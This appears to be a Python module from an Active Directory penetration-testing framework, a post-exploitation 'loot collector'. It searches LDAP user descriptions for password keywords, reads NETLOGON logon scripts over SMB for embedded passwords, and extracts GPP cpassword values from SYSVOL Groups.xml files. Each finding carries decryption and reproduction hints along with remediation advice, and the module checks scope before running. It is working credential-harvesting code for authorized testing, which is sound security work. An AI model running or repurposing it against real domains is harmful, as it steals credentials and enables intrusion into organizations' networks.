"""Loot Collector — gather high-value data from compromised AD environment."""
from __future__ import annotations
import sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"

class LootCollector(BaseModule):
    NAME = "loot_collector"
    DESCRIPTION = "Collect high-value AD data: GPP passwords, description creds, SYSVOL scripts"
    PHASE = 13
    TAGS = ["post", "loot", "cwe-312"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        dc_ip = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")
        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
            nt_hash=self.config.extra.get("hash", ""))
        if not client.connect(): return self._make_result(start)

        loot = []
        try:
            # 1. Credentials in description fields
            await self.rate_limit()
            users = client.search(
                "(&(objectCategory=person)(description=*))",
                ["sAMAccountName", "description"])

            pwd_keywords = ["password", "passwd", "pwd", "pass:", "cred", "secret", "token", "key"]
            for u in users:
                desc = str(u.get("description", "") or "").lower()
                if any(kw in desc for kw in pwd_keywords):
                    loot.append({
                        "type": "description_credential",
                        "source": str(u.get("sAMAccountName", "?")),
                        "value": str(u.get("description", ""))[:80],
                    })

            # 2. SYSVOL scripts via SMB
            try:
                from impacket.smbconnection import SMBConnection
                await self.rate_limit()
                conn = SMBConnection(dc_ip, dc_ip, timeout=5)
                conn.login(
                    self.config.extra.get("username", ""),
                    self.config.extra.get("password", ""),
                    domain,
                    nthash=self.config.extra.get("hash", ""))

                # List NETLOGON scripts
                try:
                    scripts = conn.listPath("NETLOGON", "*")
                    for f in scripts:
                        fname = f.get_longname()
                        if fname in (".", ".."): continue
                        if fname.endswith((".bat", ".cmd", ".ps1", ".vbs")):
                            # Read script content
                            try:
                                fid = conn.openFile("NETLOGON", fname)
                                content = conn.readFile("NETLOGON", fid, 0, 8192)
                                conn.closeFile("NETLOGON", fid)
                                text = content.decode(errors="ignore") if content else ""
                                # Check for embedded credentials
                                import re
                                for m in re.finditer(r"(?:password|passwd|pwd)\s*[=:]\s*['\"]?(\S+)", text, re.I):
                                    loot.append({
                                        "type": "script_credential",
                                        "source": f"NETLOGON\\{fname}",
                                        "value": m.group(0)[:80],
                                    })
                            except Exception:
                                pass
                except Exception:
                    pass

                # Check for GPP cPassword (Groups.xml)
                try:
                    gpo_base = f"{domain}\\Policies"
                    policies = conn.listPath("SYSVOL", f"{gpo_base}\\*")
                    for pol in policies:
                        pname = pol.get_longname()
                        if pname in (".", ".."): continue
                        for subpath in [
                            f"{gpo_base}\\{pname}\\Machine\\Preferences\\Groups\\Groups.xml",
                            f"{gpo_base}\\{pname}\\User\\Preferences\\Groups\\Groups.xml",
                        ]:
                            try:
                                fid = conn.openFile("SYSVOL", subpath)
                                content = conn.readFile("SYSVOL", fid, 0, 8192)
                                conn.closeFile("SYSVOL", fid)
                                text = content.decode(errors="ignore") if content else ""
                                if "cpassword" in text.lower():
                                    import re
                                    for m in re.finditer(r'cpassword="([^"]+)"', text, re.I):
                                        loot.append({
                                            "type": "gpp_password",
                                            "source": subpath,
                                            "value": f"cpassword={m.group(1)[:20]}...",
                                        })
                            except Exception:
                                pass
                except Exception:
                    pass

                conn.close()
            except ImportError:
                pass

            if loot:
                ev = Evidence(extra={"loot": loot[:30], "total": len(loot)})
                self.new_finding(
                    title=f"AD Loot — {len(loot)} credential artifacts collected",
                    severity=Severity.HIGH,
                    description=(
                        f"Collected {len(loot)} credential artifacts from AD:\n"
                        + "\n".join(f"  [{l['type']}] {l['source']}: {l['value'][:50]}" for l in loot[:10])
                    ),
                    reproduction_steps=[
                        "# GPP passwords: gpp-decrypt <cpassword>",
                        "# Description creds: Get-DomainUser -Properties description | Where description -match 'pass'",
                    ],
                    remediation=(
                        "1. Remove all credentials from description fields\n"
                        "2. Delete GPP XML files with cpassword (MS14-025 patched decryption)\n"
                        "3. Remove credentials from NETLOGON scripts\n"
                        "4. Rotate ALL discovered credentials"
                    ),
                    references=["CWE-312", "MS14-025", "MITRE T1552.006"],
                    evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                    mitre_attack=["TA0006/T1552.006"],
                    target=dc_ip)
        finally:
            client.disconnect()
        return self._make_result(start)

class TestLootCollector:
    def test_phase(self) -> None: assert LootCollector.PHASE == 13
